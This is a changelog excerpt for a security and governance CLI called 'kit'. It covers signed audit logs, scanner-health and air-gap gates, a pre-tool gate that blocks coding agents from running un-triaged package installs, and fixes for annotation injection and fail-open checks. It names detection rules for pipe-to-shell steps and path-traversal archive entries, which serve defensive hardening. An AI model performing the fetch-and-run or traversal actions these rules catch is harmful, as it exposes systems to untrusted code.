  Shared memory entries are now versioned: a change is a NEW append-only entry
  that `--supersedes <id>` or `--reverses <id>` an old one (or carries an explicit
  `--status`). `kit memory share` validates the referenced id exists. Surfacing
  shows only ACTIVE decisions with their age (e.g. `2y ago`) so an aging decision
  is flagged for review, never blind obedience; `kit memory area`/`search` badge
  superseded/reversed entries (and show the chain) so "this was tried + reversed"
  still surfaces. `active` stays implicit (absent field) so pre-lifecycle entries
  are byte-identical. New `effectiveStatus`, `activeShared`, `formatAge`.
- **Shared (curated) memory folded into recall.** `kit memory search` now also
  searches the committed `.kit/shared/memory.jsonl` tier and surfaces matching
  team decisions/conventions _above_ raw transcript hits (`--json` now returns
  `{ messages, shared }`). SessionStart recovery re-injects the project's most
  recent durable shared decisions (kinds: decision/convention/security/status),
  so a resumed session regains the settled context, not just the last few raw
  turns. Both paths are project-local and fail-open (a missing/broken shared
  store never breaks recall).
- **Berget AI + Grunden.ai as known providers.** Added `berget` and `grunden`
  (EU-sovereign, OpenAI-compatible inference) to the service registry with their
  canonical key names (`BERGET_API_KEY`/`BERGET_BASE_URL`,
  `GRUNDEN_API_KEY`/`GRUNDEN_BASE_URL`) and where to get them, so `kit secrets`
  treats them as known, vault-resolved keys (never plaintext). Catalog-only by
  design: both are used via the `openai` SDK with a custom base URL, so there is
  no unique package signal to auto-detect on (keying on the `openai` dep would
  misattribute every OpenAI user). Agent-backend wiring + a Berget Code gate
  adapter are deferred.

- **Identity-signed audit entries.** When a local `kit identity` exists, each
  appended `.kit-audit.jsonl` line is signed: kit attaches `kid` (signer id) +
  `sig` (Ed25519 signature over the line hash). Best-effort and append-safe — no
  identity means entries are written as before, and a signing failure never
  blocks the append. `kid`/`sig` sit outside the hashed remainder, so the hash
  chain still verifies across mixed signed/unsigned/legacy logs. `kit audit
verify` now reports the signature tally (verified / unknown-key / unsigned)
  against the locally-known keys (current + rotated) and FAILS hard on a forged
  signature, while fail-opening on absent/unknown trust. This is the asymmetric
  ATTRIBUTION layer (who produced an entry, verifiable with only the public key)
  orthogonal to the symmetric HMAC INTEGRITY anchor. See `docs/AUDIT_ATTESTATION.md` §2.5.

### Fixed

- **`kit check` secrets scan: degraded (no-trufflehog) fallback no longer cries
  high-severity on its own noise.** The basic `git grep` path now mirrors the
  trufflehog branch's philosophy — it's UNVERIFIED, so it's a `medium` warn, not
  `high`, and it filters its two dominant false-positive classes: test/fixture/mock
  files (fake credentials live there by design; the authoritative trufflehog + CI
  gitleaks scanners still cover them and verify live) and all-caps identifier
  VALUES (an env-var name like `SOCKET_SECURITY_API_TOKEN` is a config key, never a
  secret). Removes a self-inflicted false positive on kit's own source and the
  test fixtures; the authoritative scanners are unchanged.

## [2.2.0] - 2026-06-28

kit 2.2 — agent gate coverage + the first 3.0 primitive. Additive minor: new
experimental commands and adapters, no breaking changes to any `stable` surface.

### Added

- **Install-gate now covers 7 agents.** `kit agent-config --install-gate` wires a
  pre-tool gate that blocks an un-triaged package install before it runs.
  Deterministic core (`parseInstallCommand` + `decideBashGate`, npm/pnpm/yarn/bun
  /npx + pip/pip3/pipx/uv; fail-closed; out-of-scope ecosystems pass through) plus
  per-agent adapters: Claude Code / Codex / Amazon Q / Gemini CLI / Cursor (exit-2
  hooks), OpenCode (generated `.opencode/plugin` hooking `tool.execute.before`,
  throws), and Cline (executable `.clinerules/hooks/PreToolUse` shim → `{cancel:true}`
  stdout contract). Each adapter was built only after verifying the agent's hook +
  payload schema against primary sources. Continue has no external pre-tool hook
  surface (declarative permissions only). `gate-bash` (experimental) is the handler.
- **`kit identity`** (experimental) — a local Ed25519 machine/agent identity
  (init / show [--public] / rotate). Asymmetric, attributable signing: a verifier
  needs only the public key, never a forge-capable secret. Private key stored
  owner-only under `~/.kit`.
- **`kit ci --init gitlab|bitbucket`** — generate a pipeline snippet that runs
  `kit ci` (GitLab job → JUnit; Bitbucket step). Prints to stdout; `--write` writes
  the file only when absent. Plus `docs/CI_AND_GIT_HOSTS.md` (the 4-layer gate model
  - per-host enforcement guidance).
- **`kit gha-audit` extended to GitLab CI + Bitbucket Pipelines** — lints
  `.gitlab-ci.yml` / `bitbucket-pipelines.yml` for unpinned `:latest`/untagged
  images (CWE-1104), remote `include:` (OWASP-A08), and pipe-to-shell (CWE-494).
- **OpenCode coverage** — SQLite (`opencode.db`) memory parser (with the legacy
  flat-JSON path as fallback), and `agent-audit` now scans `.opencode/plugin`.
- **trivy + trufflehog declared as managed tools** (`.kit.toml [tools]`) so
  `kit install` provisions them; a non-gating CI job dogfoods the provision+scan path.

### Changed

- **Memory: debounced mid-session indexing** — recall stays fresh within a long or
  ephemeral session (a detached `kit memory index` at most once per 10 min on the
  UserPromptSubmit hook), not only at SessionEnd.
- Pinned the 7 previously range-specced dependencies to exact versions.

### Fixed

- ci-audit no longer mis-reports a bare `name:` label (e.g. a Bitbucket step name)
  as an unpinned image.
- gitignore `.kit-triage.jsonl` (kit's local triage audit log).

## [2.1.1] - 2026-06-27

kit 2.1 (Reach) — native Windows. The build + ~all tests already ran on windows-latest; this closes the remaining cross-platform gaps so kit runs natively on Windows (PowerShell/cmd), not only via WSL2.

### Fixed

- **Native Windows: 17 cross-platform test/runtime gaps closed** (verified on a windows-latest CI runner). Path handling made separator-agnostic (`path.isAbsolute`, `path.relative` containment, `path.posix.join` for shell-profile content, manual `/`+`\\` split for repo-name derivation); bare-tool resolution uses `where` on win32 (the `mise which` fast path already worked); plugin adapters import via `pathToFileURL` (a bare `C:\\...` path is not a valid ESM URL); `~/.kit/bin/kit` now also emits a managed `kit.cmd` shim on Windows; secret-file hardening asserts the platform-appropriate guarantee (icacls on NTFS, `0600` on POSIX); bumblebee cache-reuse + integrity no longer short-circuit on the platform gate. The `public-surface` golden snapshot is canonicalized (forward-slash + LF, pinned via `.gitattributes eol=lf`) so one committed snapshot matches macOS, Linux, and Windows.
- `docs/PLATFORM_SUPPORT.md` updated to reflect that native Windows now builds + passes the suite (residual gaps documented honestly, e.g. the bumblebee scanner binary ships POSIX-only so it honest-skips on native Windows).

## [2.1.0] - 2026-06-27

kit 2.1 (Reach), part 1 — make kit's governance fire everywhere a fleet actually runs.

### Added

- **Headless bootstrap self-heal.** Git hooks and the memory-capture hook invoke kit, but in a non-login shell (containers, CI, some agent runners) `PATH` lacks the mise shims and `~/.npm-global/bin`, so the hook silently dies and memory/audit capture never fires. kit now generates a managed `~/.kit/bin/kit` wrapper (prepends the mise shim dir + `~/.npm-global/bin`, then exec's the absolute `node dist/cli.js`) and wires hooks to call it by absolute path. Created idempotently by `kit hooks add` / `kit memory install` (marker-guarded — never clobbers an unmanaged `~/.kit/bin/kit`), and `kit doctor` now checks for it. Capture works by default in agent containers.
- **`kit memory sync` — local-first cross-machine memory.** `~/.kit/memory.db` is per-machine; the tested `mergeDb` was wired to nothing. `kit memory sync <export.db | encrypted-backup>` merges another machine's memory into the local store (last-write-wins on session conflicts; machine-local `file_index` excluded). Transport is your own git repo or an encrypted backup file — no cloud ledger. Pairs with `kit memory backup` (machine A backs up + commits/copies the encrypted file; machine B syncs it), so agent B recalls agent A's decisions.

### Still tracked for 2.1.x

Windows native completion (driven via the `windows.yml` CI loop) and the structured `Result<T, ErrorCode>` exit contract.

## [2.0.0] - 2026-06-27

**kit 2.0 — the floor you can prove and build on.** This major release does not chase scope; it makes kit's two core promises real: `green = honest` becomes externally _provable_, and kit's public surfaces become _frozen, versioned contracts_. The 1.38–1.42 increments below built it; 2.0.0 declares it.

> kit runs every gate and can emit a signed receipt — anchored to a key its own process cannot recompute — proving which scanners actually ran and that none failed open, verifiable offline; and its CLI, config schema, and plugin SDK are now frozen contracts that will not break across all of 2.x.

### Why a major bump

- **The CLI is a contract now.** Every command carries a stability tier; `stable` commands will not be removed, renamed, or have their exit-code / `--json` semantics broken across 2.x (additive-only in minors). A committed `contracts/public-surface.json` golden snapshot + drift test enforces this — a surface change fails CI until it is reviewed, regenerated, and labeled `BREAKING`.
- **The config schema is versioned.** `.kit.toml` now carries a `version`, and `kit config migrate` deterministically migrates older configs (dry-run default, auto-backup, re-validate-or-restore). Migration tooling cannot ship under a 1.x tag, so the major number _is_ the contract. **Upgrade note:** run `kit config migrate` once; v1 is the baseline (a no-op stamp), so nothing breaks today, but the path is now in place.
- **`adapter-sdk@1.0`** is frozen on its own semver track.

### Added (in 2.0.0)

- **`kit coverage`** — deterministic OWASP ASVS 4.0.3 L2 _evidence_ emit. Maps kit's checks/rules to a vendored, pinned, curated control subset and buckets each as auto-verified / gap / manual / n-a. It is explicitly **an evidence map, not a compliance attestation** (never claims "compliant"); be the deterministic evidence source a GRC tool consumes, not a worse one. `experimental` tier.

### The 2.0 pillars (shipped across 1.38–1.42)

- **Provable Green** — scanner-health gate (a crashed/missing scanner can no longer exit 0) + `--strict`/`required_scanners` (1.38.0); provable air-gap (`kit airgap verify`, registry egress refused in both scan paths) (1.38.0); external HMAC-anchored audit chain + signed `kit check` attestation, honest about the same-UID limit (1.39.0); `kit coverage` (2.0.0).
- **Frozen Contracts** — versioned `.kit.toml` + `kit config migrate` (1.41.0); tiered command surface + deprecation policy + `adapter-sdk@1.0` + the golden-snapshot drift CI (1.42.0).
- **Auditable Core** — `self-audit` rule R12 (cloud-sync conflict-copy guard) + began breaking up the `cli.ts` god-file into `src/commands/*` (1.40.0).

### Deliberately NOT in 2.0 (kept out to keep the floor defensible)

No cryptographic fleet-identity control plane, no cloud team-RBAC, no LLM provider in core, no plugin marketplace, no FIPS/regulated edition, no GRC-framework reimplementation. Cross-platform reach (Windows native completion, headless-bootstrap self-heal, local cross-machine memory sync) and the structured `ErrorCode` exit contract are tracked for 2.1.

## [1.42.0] - 2026-06-27

kit 2.0 Phase 1 (frozen contracts) — the mechanism that earns the major bump: kit's public surfaces become versioned, tiered, and drift-enforced. No behavior change.

### Added

- **Stability tiers on every command.** Each command now carries a `stable | experimental | deprecated` tier (`COMMAND_TIERS`, keyed alongside `COMMANDS`/`COMMAND_HELP`). All shipped commands are `stable` (the 2.x no-break promise) except `team` (`experimental` — placeholder backend). `deprecated` commands print a stderr warning every run. `command-surface` parity is now 3-way (tier + help for every command). New `docs/CLI_STABILITY.md` documents the tiers, the stable-across-2.x promise, and the deprecation policy.
- **`adapter-sdk` frozen at 1.0.0** on its own semver track (decoupled from kit's version). The public surface (`ServiceAdapter`, `AdapterContext`, `AdapterRegistry`, `ProvisionResult`, `ReadOnlyModeError`, `isReadOnlyMode`, `assertNotReadOnly`) is documented `@public`/frozen with a SDK `CHANGELOG.md`, a kit-compatibility matrix, and caret-pin guidance. (One mild wart — `ProvisionResult` carrying both `message` and `error` — is flagged and frozen as-is, deferred to the SDK's next major.)
- **Breaking-change detection — a golden public-surface snapshot.** `contracts/public-surface.json` is a committed, deterministically-serialized snapshot of the public contract (command names + tiers, config schema sections + `CONFIG_SCHEMA_VERSION`, adapter-sdk version + exports, MCP tool names, exit codes). A test regenerates the live surface and fails on any drift, instructing the author to review, regenerate + commit the snapshot, and add a `BREAKING` note when a stable contract changes. The stability promise is now enforced, not asserted.

## [1.41.0] - 2026-06-27

kit 2.0 Phase 1 (frozen contracts), the first move: give `.kit.toml` a versioned schema + deterministic migration, so a future breaking config change can be migrated rather than silently corrupting every existing config.

### Added

- **`.kit.toml` schema version + `kit config migrate`.** A new optional top-level `version` field (`CONFIG_SCHEMA_VERSION = 1`; an absent field is treated as legacy v0). `kit config migrate` runs an ordered, pure, fixture-tested migration registry from the detected version to the current one: `--dry-run` (prints the plan + a value-level diff, writes nothing), a real run writes `.kit.toml.backup` first (refuses to clobber an existing backup without `--force`) then re-parses + Zod-validates the result and **restores the original on any failure** (never leaves a corrupt config), and `--check` exits non-zero on a stale config for CI. The v0→v1 migration only stamps the version (v1 is the baseline), but the framework is real and extensible — a future field rename is a single data row. `kit config` is a new top-level command.

## [1.40.0] - 2026-06-26

kit 2.0 Phase 0 (auditable core) — internal hygiene that lets the public surface be frozen in Phase 1. No behavior change.

### Added

- **`self-audit` rule R12-dup-source** — flags cloud-sync conflict copies (the iCloud/Dropbox `' 2'`/`' 3'` footgun: files like `foo 2.ts`, stray `dist 2/` mirror dirs). Severity `warn` (these are local-env junk, gitignored, never shipped; the rule turns a silent footgun into a surfaced advisory). Pure `isConflictCopyFile`/`isConflictCopyDir` analyzers.

### Changed

- **Began breaking up the `cli.ts` god-file.** Extracted 7 command families (`context`, `airgap`, `triage`, `scan`, `verify-provenance`, `gha-audit`, `sbom`) into focused `src/commands/*` modules; `cli.ts` shrinks from 6482 to 5662 lines and stays a dispatcher referencing them. Behavior-preserving — the `command-surface` parity test gates every move. Extraction continues incrementally (the `ci`/`check`/`self-audit` cluster needs the shared CI-format helpers lifted into a module first; secrets/security/setup clusters next).

## [1.39.0] - 2026-06-26

kit 2.0 Pillar 1 (Provable Green), part 2: make the audit trail attestable, and be honest about exactly how far that goes.

### Security

- **Audit chain gains an external HMAC anchor.** The `.kit-audit.jsonl` chain was tamper-_evident_ but fully recomputable by any writer (keyless SHA-256 from a public genesis). A machine-local anchor key (`~/.kit/audit-anchor.key`, 0600, reusing the `elevation.ts` pattern) now seals the chain into a separate 0600 anchor record (HMAC tip + sealed entry count). `kit audit verify` detects a keyless prefix rewrite (tip mismatch) and truncation/rollback (count), and `kit audit anchor` seals a log. The append path stays keyless (so a sandboxed agent with no key access keeps logging); the key is only needed to seal/verify. **Honest by design:** this raises forgery from "anyone who can write the log" to "someone who can read the 0600 key" — it is **not** tamper-proof against a same-UID local principal (that needs the documented, stubbed external TSA anchor). Key rotation reports as a distinct `anchor-key-changed` status (not a false tamper alarm), and a tampered/rotated prefix is never silently re-sealed.
- **`kit audit verify --strict` / `[governance.audit].require_anchor` — fail-closed.** By default an unanchored log / unreadable key / unsealed tail is a warn (backward-compatible). Strict mode (or once the machine has anchored any log) makes them hard failures, so a project-writable `[governance.audit].log_file` cannot repoint verification at a forged, never-anchored file and pass. An unsealed tail past the seal is unauthenticated and surfaced loudly.
- **Signed check-attestation receipt** (`kit check --attest` / `kit ci --attest` / `KIT_ATTEST=1`) — opt-in, fail-soft (never blocks or alters the verdict). Writes `.kit-check-attestation.json` recording which scanners actually ran + the verdict, signed with the machine-local HMAC anchor key (authoritative — the verifier needs that key). An Ed25519 receipt is a portable fallback whose **embedded public key is untrusted**: `kit check verify-attestation` reports `unverified-authenticity` (not green) unless the key is pinned (TOFU in `~/.kit`, refuses silent overwrite) or passed via `--key`; a non-matching key fails. No "forgery requires the key" overclaim for the Ed25519 path.

### Fixed

- Hardened a key-file create race (a lost `wx` race could re-read a partial/empty key) — `reReadHexKey` now enforces the length guard with bounded backoff and never returns a short key; applied to both the audit anchor and `elevation.ts`.

## [1.38.0] - 2026-06-26

First step toward kit 2.0 ("the floor you can prove and build on"): close two fail-open holes in the "green = honest" promise. Both default to backward-compatible behavior; the stricter posture is opt-in.

### Security

- **Scanner-health gate — a crashed or missing scanner can no longer pass silently.** `kit scan`'s exit verdict was findings-only (`bad === 0`), so a scanner that errored / wasn't installed / lacked its token still exited 0 (a false green). A new pure `scanHealthGate(runs, {requiredScanners, strict})` now also accounts for scanner _health_. Default stays a loud warn (no existing green CI breaks); opt in to hard-fail via `[governance.scan].required_scanners` (a scanner in this list that didn't run fails) or `kit ci --strict` / `KIT_CI_STRICT=1` (any non-running scanner fails). `kit ci` gains the same `--strict` lever. New `[governance.scan].required_scanners` config key.
- **Provable air-gap — no silent egress, and local rulesets can finally run offline.** Added `kit airgap verify`: asserts every scanner that would run in air-gap mode resolves to a local artifact (no cloud-only, no registry config) and prints a pass/fail table. In air-gap mode a registry (`p/…`) `KIT_SEMGREP_CONFIG` is now refused with a loud message in **both** scan paths (`kit scan` and `kit ci`'s `checkSemgrep`) because it would egress to the semgrep registry — while a **local** ruleset path is now correctly _kept_ (previously semgrep was dropped wholesale in air-gap, so it could never run even fully offline). New pure helpers `isLocalSemgrepConfig` + `verifyAirGapScanners`.

## [1.37.0] - 2026-06-26

### Added

- **`kit triage brew <formula>`** — Homebrew gets a triage channel (npm / pip / docker / repo / skill / brew). kit resolves the formula's upstream repo via `brew info --json=v2` and delegates to the existing `repo` health-score, so a formula is only vouched for via its source. Fail-closed: a disabled formula, or one whose upstream GitHub/GitLab repo cannot be resolved, does NOT pass (the source went unscored). The formula name is validated before it reaches the `brew` arg-array (no shell), blocking flag/arg injection. Pure `parseBrewInfo` so it is fully unit-tested without brew installed.

### Changed

- **semgrep SAST is now privacy-respecting and opt-in.** It previously ran `--config auto`, which forces telemetry on and phones the semgrep registry — and once semgrep was installed it ran a multi-second, networked scan by default that dominated `kit check` / `kit ci` and surfaced registry-ruleset false positives (e.g. local Supabase demo JWTs). Now: semgrep runs only when `KIT_SEMGREP_CONFIG` is set (gated via the same `needsToken` skip mechanism as Snyk/Socket), and when it runs it uses that explicit ruleset with `--metrics off` (no telemetry) plus `--exclude` of common test/build/fixture dirs. Default `kit check` / `kit ci` skip it with a clear "set KIT_SEMGREP_CONFIG (e.g. p/default, or a local ruleset path) to enable" message. Set it to a `p/*` pack for the registry ruleset, or to a local ruleset path to run air-gapped. Shared, unit-tested `buildSemgrepArgs` / `semgrepConfig` helpers back both the scanner registry and the `kit check` SAST step.

## [1.36.0] - 2026-06-26

### Added

- **`kit self-audit` — kit checks its own source for the bug-classes the paranoid audit found.** A deterministic, zero-LLM, local-first self-check that runs 12 rules over kit's own tree and asserts every CI-referenced script path actually exists on disk. It self-targets kit (resolves the package by `name === "sandstream-kit"`, anchored to the module dir, never the cwd), so it audits kit even when invoked from a consumer project, and skips gracefully if kit's source isn't found.
  - **Gating (error) rules:** R11 every `.github/workflows/*` `run:` script (`node`/`python`/`npm run`) resolves to a real file/script (the exact `triage.py` false-green class), R1 unannotated `|| true` in a CI step, R3 secret/state file written world-readable (octal mode is value-checked: `0o644`/`0o777` fail, `0o600`/`0o400` pass), R6 `import()`/`require()` of a non-literal spec without name-validation **and** path-containment (window-scanned, so a Prettier line-wrap can't hide it), R7 attacker-controlled data interpolated into `::error::`/JUnit XML/step-summary without escaping, R9 a write to the hash-chained `.kit-audit.jsonl` outside the chaining writer.
  - **Warn rules:** R1 `continue-on-error: true`, R1b NaN/invalid timestamp treated as fresh, R2 secret value reaching argv/error text, R4 untrusted spec used before its validator, R8 a mutating MCP tool missing its read-only guard (fail-closed: every `kit_*` tool is enumerated, not a hardcoded subset).
  - **Advisories (info):** R10 third-party CLI invoked by bare name (PATH-hijack surface), R5 env var that relaxes a check to skip. These are aggregated to one line per class and never counted as warnings or gated on.
  - Flags: `--format=text|github|gitlab`, `--json`, `--fail-on-warning`, `--only=<ids>`, `--list-rules`. Output reuses kit's existing CI-annotation/JUnit emit and exit-code convention. A new **warn-only `self-audit` job** runs in kit's own CI (gated so a reintroduced gating-class regression blocks the security gate).

### Security

- **Live GitHub-annotation injection fixed in the MCP server.** `kit_ci`'s `--format=github` emitter interpolated config-controlled check `category`/`name`/`detail` raw into `::error::`/`::warning::` lines; it now escapes them via the shared `escapeWorkflowCmd` (the annotation-forgery class `self-audit` R7 exists to catch — found by dogfooding the new rule).
- **Dead, fail-open SAST step removed.** `security.yml` ran `npx eslint --plugin security … || true` where the plugin was never installed (the command crashed and `|| true` masked it, so the step ran zero rules and always passed). Removed; Semgrep remains the real SAST gate.
- **`kit_login` now honors read-only mode.** It performs outward auth + mutates `process.env` but lacked an `isReadOnlyMode()` guard (surfaced by the fail-closed R8 rule); it now refuses under read-only mode like the other mutating MCP tools.

### Changed

- `SecurityCheckResult.category` widened to admit `self-audit/<class>` values (drops two unsafe `as` casts). The duplicated source-file walkers in `check-tests.ts` and `check-design.ts` are consolidated into a shared `src/source-walk.ts` (behavior-preserving). The CI-output escapers (`escapeWorkflowCmd`/`xmlEscape`) moved to `src/utils/ci-escape.ts` so the MCP server can reuse them without importing the CLI entrypoint.

## [1.35.0] - 2026-06-26

### Security

Paranoid line-by-line audit hardening pass — a batch of fail-closed and least-privilege fixes found by an exhaustive review. None were known-exploited; all close latent gaps before anything gates on them.

- **CI dependency-triage gate now fails CLOSED.** `.github/workflows/triage-deps.yml` ran the triage script from a stale path with `|| true`, so a moved/missing script or a non-zero exit silently passed the gate. It now verifies the script is present (hard-fails if not), drops `|| true`, captures the real exit code, and treats a non-zero exit **or** a missing `PASSED`/`WARNING` verdict as a hard `FAILED`.
- **Publish supply-chain gate can be forced fail-closed.** `KIT_BUMBLEBEE_REQUIRED=1` promotes a "scanner unavailable" `warn` to a `fail`, so the release pipeline cannot green-light a publish when the supply-chain scanners never actually ran.
- **Supply-chain findings no longer corrupt the audit hash-chain.** `logSupplyChainFindings` appended to `.kit-audit.jsonl`, breaking the tamper-evident chain; findings now go to a separate `.kit-findings.jsonl`. Extracted a pure `buildSupplyChainFindingLines()` (fixture-tested).
- **MCP `kit_secrets` never returns plaintext.** The tool stripped to a sanitized projection — secret `value`s are no longer included in the MCP response. All mutating MCP tools are gated behind read-only mode and refuse to write when it's on.
- **MCP `kit_run` is bounded.** Added an execution timeout and a bounded output buffer so a hung or chatty child can't wedge or balloon the server.
- **Triage sandbox hardened against malicious packages.** Fetch runs with `--ignore-scripts`; non-registry specs are rejected; archive entries are listed and any `..`, leading-`/`, or symlink entry is rejected **before** extraction; tarball extraction uses the dash form (`tar -xzf`) to fix a silent macOS bsdtar failure.
- **Plugin loader validates before import.** Plugin names are regex-validated and a path-containment assertion (resolved path must not escape the plugins dir) runs before `import()`.
- **Revocation fails closed on malformed responses.** `fetchRevocationStatus` now requires `typeof revoked === "boolean"` and treats anything else as revoked; an enabled-but-misconfigured revocation (blank endpoint or agent id) also fails closed.
- **Secret/state files locked to the owner.** `.env.local`, `.env.ci`, provisioned tokens, and the memory DB (`memory.db` + `-wal`/`-shm`) are written via `secureFile`/`secureDir` (0o600/0o700; icacls on Windows).
- **CI annotation output is escaped.** GitHub annotations, the GitLab JUnit report, and the step-summary now escape their data (`escData`/`xmlEscape`), so a crafted finding string can't inject annotation/markup. `cmdTriageCheckDeps` treats a NaN/invalid cache timestamp as expired (fail-closed).
- **Read-only mode is enforced on more write paths** — `kit install` (mise), `kit context use`, `kit env` switch, and `kit fix` now refuse and audit instead of writing when read-only mode is active.

### Fixed

- **`kit upgrade --self` gives actionable guidance on EACCES.** A failed global `npm install -g sandstream-kit@latest` (the common permission error on system Node) now prints the remediation — `npm config set prefix ~/.npm-global` (or a Node version manager) — instead of a bare "command failed".

## [1.34.0] - 2026-06-26

### Added

- **Setup modes — `kit setup --mode <name>` / `[setup].mode`.** Named presets over kit's setup knobs (install / login / secrets / hooks / recommended hardening / network posture / read-only): `full` (everything, ≡ prior behavior), `local`, `airgap` (forces the air-gapped posture, cloud scanners dropped), `ci`, `agent` (for gastown/ruflo-style runners), `review` (read-only audit of an untrusted repo — zero writes/installs/logins), `minimal`. The mode gates which setup steps run and forces the `[air_gap]` posture; unknown names warn and fall back to `full`. Agent-agnostic — modes mean the same thing under any harness.
- **`kit statusline` — agent-agnostic info-bar emitter.** One compact, fast, read-only line — setup score for the active mode + an "update available" mark + the open PAL ("blocked on you") count, e.g. `kit:full 6/6 · ⬆1.34.0 · ⚠2`. Cached-only (never blocks/fetches); wire it into Claude Code's `statusLine`, a shell PS1, or any harness's bar. `kit agent-config` now also tells the agent to run it at session start, so harnesses without a native bar still surface it.
- **`kit status` is mode-aware** — adds a `mode <name>: M/N subsystems — next: …` line scoring progress against the active mode's expected subsystems.

## [1.33.3] - 2026-06-25

### Security

- **Two false-greens turned honest.** `npm audit` exiting 0 with no parseable report is now a `warn` ("could not confirm — unverified") instead of a silent green pass, so a broken/odd npm can't green-light the dependency check. The Infisical secret check's auth-only fallback (CLI authenticated, but key _presence_ never confirmed) now renders `warn` via a new `unverified` flag rather than a confident green `pass` — it stops claiming a check it didn't actually perform.

### Docs

- Docs sweep — README + `docs/COMMANDS.md` now match shipped reality: **Socket** documented as a real cloud scanner (runs with `SOCKET_SECURITY_API_TOKEN`, dropped in air-gap, gated on `socket ci`'s exit code) instead of a permanent skip; `socket` added to the scanner-registry lists; `kit setup` documented as 6-step + the network-posture prompt; added the missing `kit security prescan` / `prescan-diff` / `scan-transcripts` and `kit audit secrets` / `verify` / `export` reference rows.

## [1.33.2] - 2026-06-25

### Fixed

- **`kit verify-provenance`, `kit sentinel`, and `kit supply-chain` are now config-free** — like `kit scan` (1.32.0). All three aborted with "Create a .kit.toml" when no config was present, even though they're project-agnostic (verify a bundle, propose health fixes from codebase analysis, read the lockfile). A missing `.kit.toml` now falls back to an empty config and none of them writes one. Covered by the `vendor-repo safety` integration tests.

## [1.33.1] - 2026-06-25

### Security

- **Revocation now fails CLOSED.** `fetchRevocationStatus` returned `{revoked: false}` when the revocation endpoint was unreachable or errored — so anyone who could disrupt the endpoint could disable the kill-switch. It now returns `{revoked: true}` on any endpoint error. (The "no endpoint configured / disabled" case stays not-revoked — the feature is simply off.) Caught while it's still latent, before anything gates on it. New `revocation.test.ts` locks the behavior.
- **Secret temp files locked to the owner.** `mkdtemp` is 0o777-masked, so the plaintext-secret temp files written by `kit secrets purge-history` (the scrub-pattern file) and the OneCLI key-materialization path were briefly world-readable on multi-user systems. Both now go through `secureDir`/`secureFile` (0o700/0o600; icacls on Windows).
- **Elevation-marker tampering is no longer silent.** `readElevation` caught every error and returned null, so a corrupted/forged marker looked identical to "expired". A missing file is still silently "not elevated", but a present-but-unparseable or bad-signature marker now warns (still fail-closed).

## [1.33.0] - 2026-06-25

### Added

- **Network-posture choice in `kit setup` / `kit init`.** Setup now asks **Connected** vs **Air-gapped enclave** and writes `[air_gap] enabled` to `.kit.toml` (idempotent — reports + skips if already set; non-interactive defaults to connected without writing). Air-gapped prompts for internal mirrors (npm/pypi/github/docker) + signed threat-data dir. Connected points at _where_ the cloud-scanner tokens live — kit **never captures, echoes, or stores** them; it only references the source (vault `[scan.tooling]` or env) and reads them at scan time.
- **Socket wired as a real cloud scanner.** `kit scan` runs `socket ci` when `SOCKET_SECURITY_API_TOKEN` is present (cloud-only → dropped in air-gap). Because Socket has no stable findings-JSON, kit gates on the exit code via a new `exitGate` scanner mode — exit 0 = clean, non-zero = one high-severity policy-violation finding (never false-green). Pure helpers (`airGapTomlBlock`, the exitGate path) fixture-tested.

### Security

- **CI: every GitHub Action pinned to a node24 commit SHA.** Cleared the Node 20 deprecation warning by SHA-pinning the first-party actions to current node24 releases (`checkout` v7, `setup-node` v6, `setup-python` v6, `github-script` v9, `upload-artifact` v7, `attest-build-provenance` v4, `codeql-action`) and froze the remaining mutable tags (`anchore/sbom-action`, `aquasecurity/tfsec-action`, `gitleaks-action`) to commit SHAs. This is `kit gha-audit`'s own advice (no unpinned/`@vN` action refs), applied to kit's own pipeline.

## [1.32.0] - 2026-06-25

### Fixed

- **`kit scan` is now config-free.** Scanning is project-agnostic, yet `kit scan` aborted with "Create a .kit.toml" when no config was present — forcing a `kit init` (which writes a `.kit.toml` and runs setup) just to scan a repo. Now a missing config falls back to an empty one: scan runs in any directory and never writes a config file. Air-gap posture + scanner tokens still come from `.kit.toml` when present, otherwise from env.
- **`kit init --no-setup` is honored.** `--no-setup` was only parsed by `kit clone`; `kit init --no-setup` silently ignored it and ran the full install/login/secrets pipeline anyway. It now stops after generating `.kit.toml` + lock files.

Both surfaced by running kit against third-party / vendor repos, where the old behavior wrote a config and ran partial setup into a repo you only wanted to scan. Covered by new integration tests (`vendor-repo safety`).

## [1.31.2] - 2026-06-25

### Changed

- **`kit help` is now grouped by category.** The flat ~75-line dump (every command + every subcommand interleaved) is reorganized into eight scannable sections: Setup & lifecycle, Review & quality, Secrets & environments, Security & supply chain, Agents & memory, Governance & access, Packages & services, Meta. Only top-level commands are listed; a `+` marks those with subcommands (reach them via `kit <command> --help` or `kit help <command>`). Categories are completeness-checked at render time — any uncategorized command still prints under "Other", so help can't silently drop one.

## [1.31.1] - 2026-06-25

### Fixed

- **`kit help` was hiding 11 of 47 commands.** `COMMAND_HELP` was hand-maintained separately from the dispatch table, so 11 dispatched commands had no help entry and were absent from both `kit help` and the did-you-mean suggestions: `health`, `scan`, `sentinel`, `supply-chain`, `agent-audit`, `gha-audit`, `sbom`, `ingest`, `verify-provenance`, plus bare `auth` and `security`. Added all 11. The dispatch table (`COMMANDS`) is now the single source of truth — exported, with `main()` guarded to the real CLI entry — and a new `command-surface.test.ts` fails the build if help ever drifts from dispatch again.

### Docs

- **README no longer claims `kit check` runs Socket.** Socket is cloud-only (dropped #103); the README now describes it as an honest `skip` (local cover: GuardDog + osv-scanner + `kit supply-chain`), documents GuardDog, and surfaces `kit scan`/`supply-chain`/`sbom`/`gha-audit`/`sentinel`/`verify-provenance` in the command shortlist + Supply-chain section. `docs/COMMANDS.md` gains a "Supply chain + scanners" section + `health`/`heal` rows; the stale "Generated 2026-06-08" header is refreshed to 1.31.0.

## [1.31.0] - 2026-06-24

### Fixed

- **JVM dependency CVE scan now covers Gradle + nested projects (#110, follow-up to #67).** `checkMavenAudit` only detected `pom.xml` at depth ≤1, so **Gradle** projects (`build.gradle`/`build.gradle.kts`) and Maven/Gradle projects in monorepo subdirs (`services/backend/pom.xml`) passed the gate green — the exact false-green #67 set out to close, for the other half of the JVM ecosystem. Now: detects Maven **and** Gradle via a depth-≤3 BFS (skipping vendor/build dirs); a Gradle project **without** a `gradle.lockfile` `warn`s (trivy sees only direct deps) instead of `skip`ping green, mirroring the `~/.m2` handling. Pure `jvmProjectKind` + `findJvmProject` fixture-tested.

## [1.30.0] - 2026-06-24

### Added

